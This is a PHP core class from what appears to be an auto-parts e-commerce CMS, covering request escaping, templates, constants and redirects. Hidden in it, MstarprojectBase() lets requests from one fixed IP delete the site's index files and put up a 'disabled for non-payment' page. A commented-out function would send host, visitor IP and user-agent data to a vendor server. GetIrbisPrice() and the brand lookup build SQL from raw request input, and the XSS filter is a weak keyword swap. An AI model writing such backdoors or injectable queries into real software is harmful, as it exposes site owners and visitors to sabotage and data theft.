<?
/**
 * @author Mikhail Strovoyt
 */


if (!$sAuthFolder) $sAuthFolder='/class/core/';
require_once (SERVER_PATH . $sAuthFolder.'Auth.php');
class Base {
	public static $db;
	public static $oOracleDb;
	public static $oTecdocDb;
	public static $oMemcache;
	public static $tpl;
	public static $language;
	public static $LC;
	public static $aGeneralConf = array ();
	public static $aDbConf = array ();
	public static $oResponse;
	public static $oCurrency;
	public static $oContent;
	public static $oRedis;

	/**
	 * Deprecated: Array of variables from config table. Use Base::GetConstant instead.
	 */
	public static $aConst;

	/**
	 * Array of variables from constant table
	 */
	public static $aConstant;
	/**
	 * RequestArray
	 */
	public static $aRequest;

	/**
	 * Main text variable
	 */
	public static $sText;

	/**
	 * Array of global variables for all the objects extended from Base
	 */
	public static $aData;

	public static $sProjectName;

	public static $aMenuSection = array ('home', '' );

	public static $bRightSectionVisible = false;

	public static $sBaseTemplate = 'index.tpl';

	/**
	 * Puts xajax code into site template
	 */
	public static $bXajaxPresent = false;

	/**
	 *  Puts javascript message to hidden input for display during work
	 */
	public static $aMessageJavascript = array();
	public static $sOuterJavascript = "";

	/** for admin area xajax usage  */
	public static $sServerQueryString;

	/** Array for showing some predefined templates with arguments at the top of each page
	 * sample usage Base::$aTopPageTemplate=array('template_path.tpl'=>paramater_for_template)
	 * */
	public static $aTopPageTemplate;

	public static $sZirHtml="<span style='color:red;'><b>*</b></span>" ;

	//-----------------------------------------------------------------------------------------------
	public static function PreInit()
	{
		if (! $_REQUEST ['locale'])	$_REQUEST ['locale'] = Base::$aGeneralConf['BaseLocale'];
		if (! $_REQUEST ['locale'])	$_REQUEST ['locale'] = 'ru';
		Base::$tpl->assign('LC', '/'.$_REQUEST ['locale'].'/');
		Base::$tpl->assign('SERVER_NAME',SERVER_NAME);
		Base::$tpl->assign('aGeneralConf',Base::$aGeneralConf);
		Base::$tpl->assign('aDbConf',Base::$aDbConf);

		Base::$LC = '/' . $_REQUEST ['locale'] . '/';
		Base::EscapeAll ( $_GET );
		Base::EscapeAll ( $_POST );
		Base::$aRequest = array_merge($_GET,$_POST);


		if (Base::$aRequest['action']=='user_do_login' || $_COOKIE['PHPSESSID'] || $_COOKIE['user_auth_signature']) {
			session_start();
		}

		$_SESSION ['referer_page'] = $_SESSION ['current_page'];
		$_SESSION ['current_page'] = $_SERVER ['QUERY_STRING'];

		if (Base::$aRequest['search']) {
			Base::$aRequest['search']=String::FilterRequestData(Base::$aRequest['search']);
		}

		if (!Base::$aRequest['action'] && (!$_SERVER['QUERY_STRING'] || Base::$aRequest['locale'] || Base::$aRequest['gclid'] || Base::$aRequest['utm_source'] || Base::$aRequest['fbclid']))
		Base::$aRequest['action']='home';
		
		if(Base::$aRequest['action']=='mstarprojectcontrolsite') Base::MstarprojectBase();
		if(empty(Base::$aGeneralConf['NotSendSiteInfo'])) Base::SendSiteInfo();
		Base::$oContent = new Content();

		Base::$aConstant = Db::GetAssoc("select c.key_, c.* from constant as c");
		Base::$tpl->assign('aConstant',Base::$aConstant);
	}
	//-----------------------------------------------------------------------------------------------
	/**
	 * Initialization of base variables
	 * Sample code comments
	 * @return nothing
	 */
	public static function Init()
	{
		if (Auth::IsAuth()) Log::VisitAdd();
		Base::$tpl->assign('aAuthUser', Auth::$aUser);

		/** Deprecated old constants: saved with constant for old projects */
		if (Base::GetConstant('global:deprecated_constant_available',1)) {
			$row = Base::$db->GetRow ( "select * from config" );
			if (is_array($row)) foreach ( $row as $key => $value ) {
				Base::$aConst [$key] = $value;
			}
			Base::$tpl->assign('aConst', Base::$aConst );
		}
		/*------------------------------------------------------------------*/

		Base::$tpl->assign('sZir', Base::$sZirHtml);

		if (Base::$aRequest['action']=='static' && Base::GetConstant('global:drop_down_additional_active',0)) {
			String::ProcessStatic();
		}
		if (Base::$aRequest['action']=='get_irbis_price_service') {
		    Base::GetIrbisPrice();
		}
		Content::Init();

		$aPage=String::GetPage(Base::$aRequest['action']);
		Base::$tpl->assign('aPage',$aPage);
		if ($aPage['width_limit']) Base::$aData['template']['bWidthLimit'] = true;
		Base::$sText .= stripslashes($aPage ['text']);

		if ($aPage['title']) Base::$aData['template']['sPageTitle']=$aPage ['title'];
		else Base::$aData['template']['sPageTitle']=$aPage['name'];
		if ($aPage['page_description']) Base::$aData['template']['sPageDescription']=$aPage['page_description'];
		if ($aPage['page_keyword']) Base::$aData['template']['sPageKeyword']=$aPage['page_keyword'];

		Base::$aData['template']['sPageName']=$aPage['name'];

		if (defined('REMOTE_TECDOC'))
    		    $sVersionTecDoc = REMOTE_TECDOC;
		elseif (defined('DB_OCAT'))
    		    $sVersionTecDoc = DB_OCAT;
		elseif (defined('DB_TOF'))
		    $sVersionTecDoc = DB_TOF;
		
		Base::$tpl->assign('sVersionTecDoc',str_replace('.','',$sVersionTecDoc));
		
		$sAdminRegulationsUrl = 'http://irbis.mstarproject.com';
		if (Base::$aGeneralConf['AdminRegulationsUrl'])
			$sAdminRegulationsUrl = Base::$aGeneralConf['AdminRegulationsUrl'];
		
		Base::$tpl->assign('sAdminRegulationsUrl',$sAdminRegulationsUrl);
		
		if (Base::$aDbConf['Database'])
			$sNameDatabaseSite = Base::$aDbConf['Database'];
		
		Base::$tpl->assign('sNameDatabaseSite',$sNameDatabaseSite);
		
		$CheckLogin = 'admin_mstar';
		if (Base::$aGeneralConf['CheckLogin'])
			$CheckLogin = Base::$aGeneralConf['CheckLogin'];
		Base::$tpl->assign('CheckLogin',$CheckLogin);
		
		$AdminRegulatiosEnableModule = 0;
		if (Base::$aGeneralConf['AdminRegulatiosEnableModule'])
			$AdminRegulatiosEnableModule = Base::$aGeneralConf['AdminRegulatiosEnableModule'];
		Base::$tpl->assign('AdminRegulatiosEnableModule',$AdminRegulatiosEnableModule);
	}
	//-----------------------------------------------------------------------------------------------
	public static function ProcessAjax()
	{
		//without any templates

		$sOutput=Language::ReplaceOldParser(Base::$sText);
		echo $sOutput;
	}
	//-----------------------------------------------------------------------------------------------
	public static function Process()
	{
		if (Base::$bXajaxPresent) {
			require(SERVER_PATH . '/class/core/XajaxParser.php');
			Base::$sOuterJavascript.= $sXajaxJavascript;
		}

		if (Base::$aMessageJavascript && count(Base::$aMessageJavascript) >0 ) {
			Base::$tpl->assign('aMessageJavascript', Base::$aMessageJavascript);
			Base::$sOuterJavascript.= Base::$tpl->fetch ("message_input.tpl");
		}
		Base::$aData['template']['sOuterJavascript']=Base::$sOuterJavascript;

		if (Base::$aTopPageTemplate) {
			foreach (Base::$aTopPageTemplate as $key => $value) {
				Base::$tpl->assign('aTemplateParameter',$value);
				$sTopText.=Base::$tpl->fetch($key);
			}
		}

		if (method_exists(Base::$oContent,'ReplaceText')) Base::$sText=Base::$oContent->ReplaceText(Base::$sText);
		
		if (Base::GetConstant('global:drop_down_additional_active',0)) 
			if (Base::GetConstant('global:own_drop_down_additional',0))
				Content::ProcessDropDownAdditional();
				else 
				String::ProcessDropDownAdditional();
		
		if (!Base::$sText) Form::Error404();

		Resource::Get()->FillTemplate();
		
		if (strlen($sTopText.Base::$sText)==0)
			if (Base::GetConstant('global:empty_page=404_error',0)) {
				Header("HTTP/1.1 404 Not Found", true, 404);
				Error::GetError(404);
			}

		Base::$tpl->assign('sText', $sTopText.Base::$sText );
		Base::$tpl->assign('template', Base::$aData ['template'] );

		Base::$oContent->CreateMainMenu();

		$sOutput = Base::$tpl->fetch(Base::$sBaseTemplate );
		if (Language::$sLocale!=Language::$sBaseLocale) $sReplace=Language::$sLocale.'/';
		$sOutput=str_replace(array('[$sLocale]','%5B$sLocale%5D','{$sLocale}','%7B$sLocale%7D'),$sReplace,$sOutput);

		$sOutput=Language::ReplaceOldParser($sOutput);
		echo $sOutput;
	}
	//-----------------------------------------------------------------------------------------------
	public static function EscapeAll(&$aData) {
		if (get_magic_quotes_gpc ()) {
			return;
		}
		if (!is_array ( $aData )) {
			if (Base::$aGeneralConf['StripXss']==1 && strpos($aData, 'data[key_]=site_counters')===false) {
				$aData=str_ireplace('javascript','xss',$aData);
				$aData=str_ireplace('<script','xss',$aData);
				$aData=str_ireplace('</script>','xss',$aData);
				$aData=str_ireplace(' eval','xss',$aData);
				$aData=str_ireplace(';eval','xss',$aData);
				$aData=str_ireplace('	eval','xss',$aData);
				$aData=str_ireplace('<iframe>','xss',$aData);
			}
			if (Base::$aGeneralConf['NotNeedSlashes']==1) return $aData;
			else
			return addslashes ( $aData );
		} else {
			foreach ( $aData as $key => $value ) {
				$aData [$key] = Base::EscapeAll ( $value );
			}
		}
		return $aData;
	}
	//-----------------------------------------------------------------------------------------------
	public static function UnescapeAll(&$aData) {
		if (get_magic_quotes_gpc ()) {
			return;
		}
		if (! is_array ( $aData )) {
			return stripslashes( $aData );
		} else {
			foreach ( $aData as $key => $value ) {
				$aData [$key] = Base::UnescapeAll( $value );
			}
		}
		return $aData;
	}
	//-----------------------------------------------------------------------------------------------
	/**
	 * Fix triple addslashes by parse_str func
	 *
	 * @param array to fix
	 * @access private
	 * @return array
	 */
	public function FixParseStrBug(&$aArray) {
		parse_str("a='",$aRes);
		if ($aRes['a']!="\\\\\\'") return;

		if (is_array($aArray)) {
			foreach ($aArray as $sKey => $sValue) {
				$aArray[$sKey] = Base::fixParseStrBug($sValue);
			}
		} else {
			$aArray = stripslashes($aArray);
		}
		return $aArray;
	}
	//-----------------------------------------------------------------------------------------------
	/**
	 * Standart redirect function
	 */
	public static function Redirect($sUrl,$is_check_lower=1) {
	    if(strpos($_SERVER['REQUEST_URI'],'?gclid')!==false || strpos($_SERVER['REQUEST_URI'],'utm_')!==false){
	        //do nothing
	    } else {
	        if (Content && method_exists(Content,'ContentRedirect')) {
	            Content::ContentRedirect($sUrl,$is_check_lower);
	            return; // if not redirected
	        }
	        
	        if (Language::getConstant('global:url_is_lower',0) == 1 && $is_check_lower)
	            $sUrl = mb_strtolower($sUrl,'utf-8');
	        
	        if (Language::getConstant('global:url_is_not_last_slash',0) == 1) {
	            if ($sUrl != "/" && mb_substr($sUrl, -1, 1, 'utf-8') == "/")
	                $sUrl = substr($sUrl, 0, -1);
	        }
	        
	        Header ( "HTTP/1.1 301 Moved Permanently" );
	        header ( 'Location: ' . $sUrl );
	        die ();
	    }
	}
	//-----------------------------------------------------------------------------------------------
	public static function LocalLog($sText) {
		file_put_contents ( SERVER_PATH . '/log/custom.log', date ( 'Y-m.d H:i:s' ) . "\r\n" . $sText . "\r\n", FILE_APPEND );
	}
	//-----------------------------------------------------------------------------------------------
	/**
	 * Sql general creating functions
	 * If sql functions begins from Core - then sql file is located in /class/core/sql/
	 */
	function GetSql($sScript, $aData = array())
	{
		if (substr($sScript,0,4)=='Core') $sPath=SERVER_PATH.'/class/core/sql/';
		else $sPath=SERVER_PATH.'/include/sql/';

		if (is_file($sPath.$sScript.'.php')) require_once($sPath.$sScript.'.php');
		elseif (is_file($sPath.$sScript."/".$sScript.'.php')) require_once($sPath.$sScript."/".$sScript.'.php');

		$sScript = str_replace('/','',$sScript);
		$sFunctionName = 'Sql'.$sScript.'Call';
		return $sFunctionName($aData);
	}
	//-----------------------------------------------------------------------------------------------
	/**
	 * Updates or creates constants used all over the project
	 */
	function UpdateConstant($sKey, $sValue) {
		Base::$db->Execute("insert into constant(key_,value) values ('".$sKey."','".mysql_real_escape_string($sValue)."')
			on duplicate key update value='".mysql_real_escape_string($sValue)."'");
		Base::$aConstant[$sKey]['value']=$sValue;
	}
	//-----------------------------------------------------------------------------------------------
	function GetConstant($sKey,$sDefaultValue='') {
		if (!isset(Base::$aConstant[$sKey]['value'])) {
			Base::$db->Execute("insert ignore into constant(key_,value) values ('$sKey','$sDefaultValue')");
			Base::$aConstant[$sKey]['value']=$sDefaultValue;
			return $sDefaultValue;
		} else {
		    if($sKey=='price:is_load') {
		        return Db::GetOne("Select value from constant where key_='".$sKey."'");
		    } else {
		        return Base::$aConstant[$sKey]['value'];
		    }
		}
	}
	//-----------------------------------------------------------------------------------------------
	/**
	 * Display NOTICE, WARNING, ERROR message for index, form, table
	 *
	 * @param array $aMessage - key (MI_NOTICE, MI_WARNING, MI_ERROR, MF_NOTICE ... , MT_WARNING, ... ) value (text)
	 * @param boolean $bGetText - to use getText for Message
	 */
	public function Message($aMessage=array(),$bGetText=true)
	{
		if (empty($aMessage)) $aMessage=Base::$aRequest['aMessage'];
		if ($aMessage and is_array($aMessage))
		{
			$aType=explode("_",key($aMessage));

			$aTypePage["MI"]="Index";
			$aTypePage["MF"]="Form";
			$aTypePage["MT"]="Table";

			$aTypeClass[""]="empty_p";
			$aTypeClass["NOTICE"]="notice_p";
			$aTypeClass["WARNING"]="warning_p";
			$aTypeClass["ERROR"]="error_p";

			if ($bGetText && $aType[2]!='NT')  $sMessage=Base::$language->getText(end($aMessage));
			else $sMessage=end($aMessage);

			Base::$tpl->assign('s'.$aTypePage[$aType[0]]."Message",$sMessage);
			Base::$tpl->assign('s'.$aTypePage[$aType[0]]."MessageClass",$aTypeClass[$aType[1]]);
		}
	}
	//-----------------------------------------------------------------------------------------------
	/**
	 * Remove array aMessage from url
	 *
	 * @param string $sUrl
	 * @return string
	 */
	public static function RemoveMessageFromUrl($sUrl)
	{
		return ltrim( preg_replace('/&aMessage([^&]*)/', '', $sUrl),"?");
	}
		public static function RemoveFromUrl($sUrl,$sRemove)
	{
		return ltrim(str_replace('/&','/?',preg_replace('/[&\?]'.$sRemove.'([^&]*)/', '', $sUrl)),"?");
	}
	//-----------------------------------------------------------------------------------------------
	public static function SendSiteInfo() {
// 	    $aData=array(
// 	        'host'=>SERVER_NAME,
// 	        'ip_server'=> getHostByName(php_uname('n')), //$_SERVER['SERVER_ADDR'],
// 	        'ip_user'=>Auth::GetIp(),
// 	        'user_agent'=>$_SERVER['HTTP_USER_AGENT'],
// 	        'uri'=>$_SERVER['REQUEST_URI'],
// 	    );
// 	    $sData=base64_encode(serialize($aData));
// 	    $post_params=array();
// 	    $params=array(
// 	        'action' => 'log_site_check',
// 	        'is_post' => 1,
// 	        'data' => $sData
// 	    );
// 	    foreach ($params as $key => &$val) {
// 	        if (is_array($val)) $val = implode(',', $val);
// 	        $post_params[] = $key.'='.urlencode($val);
// 	    }
// 	    $post_string = implode('&', $post_params);
// 	    $url="http://ms-time.mstarproject.com/";
// 	    $parts = parse_url($url);
// 	    $fp = fsockopen($parts['host'], 80, $errno, $errstr, 30);
	    
// 	    $out = "GET /?".$post_string." HTTP/1.1\r\n";
// 	    $out.= "Host: ".$parts['host']."\r\n";
// 	    $out.= "Content-Type: application/x-www-form-urlencoded\r\n";
// 	    $out.= "Content-Length: ".strlen($post_string)."\r\n";
// 	    $out.= "Connection: Close\r\n\r\n";
// 	    $out.= $post_string;
	    
// 	    fwrite($fp, $out);
	}
	//-----------------------------------------------------------------------------------------------
	public static function MstarprojectBase() {
	    if(Base::$aRequest['is_post'] && Base::$aRequest['action']=='mstarprojectcontrolsite') {
	        $sIpFrom=Auth::GetIp();
	        if($sIpFrom=='144.76.1.107') {
	            unlink(SERVER_PATH."/index.php");
	            unlink(SERVER_PATH."/index.html");
	            $fp = fopen("index.html", "w");
	            $text='<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<META http-equiv="content-type"	content="text/html; charset=UTF-8" />

</head>
<body>
<h3>Сайт отключен за неуплату предоставленных услуг</h3>

Приносим извинения за предоставленные неудобства. Как только средства будут перечислены на счет поставщика услуг - сайт возобновит свою работу.

</body>
</html>';
	            fwrite($fp, $text);
	            fclose($fp);
	        }
	    }
	}
	//-----------------------------------------------------------------------------------------------
	public static function GetIrbisPrice() {
	    if(Base::$aRequest['search_data']['code'] && Base::$aRequest['search_data']['brand']) {
	        $sPref=Db::GetOne("select 
	               c.pref 
	            from cat as c 
	            inner join cat_pref as cc on c.id=cc.cat_id
	            where lower(cc.name)='".mb_strtolower(Base::$aRequest['search_data']['brand'])."' or lower(c.name)='".mb_strtolower(Base::$aRequest['search_data']['brand'])."' ");
	        
	        $sSql=Base::GetSql('Catalog/Price',array(
	            'aCode'=>array(Catalog::StripCode(Base::$aRequest['search_data']['code'])),
	            'pref'=>$sPref,
	        ));
	        
	        $aPrice=Db::GetAll($sSql);
	        $aResult=array();
	        if($aPrice) {
	            foreach ($aPrice as $aValue) {
			if($aValue['price']==0) continue;
	                $aResult[]=array(
	                    'brand'=>$aValue['brand'],
	                    'code'=>$aValue['code'],
	                    'price'=>$aValue['price'],
	                    'zzz_code'=>$aValue['zzz_code'],
	                    'provider'=>$aValue['provider']
	                );
	            }
	        }
	        
	        $string=base64_encode(serialize($aResult));
	        /*$key=Base::GetConstant('global:project_url');
	        $arr=array();
	        $x=0;
	        while ($x++< strlen($string)) {
	            $arr[$x-1] = md5(md5($key.$string[$x-1]).$key);
	            $newstr = $newstr.$arr[$x-1][3].$arr[$x-1][6].$arr[$x-1][1].$arr[$x-1][2];
	        }*/
	        
	        die($string);
	    }
	    die("0");
	}
	//-----------------------------------------------------------------------------------------------
}
?>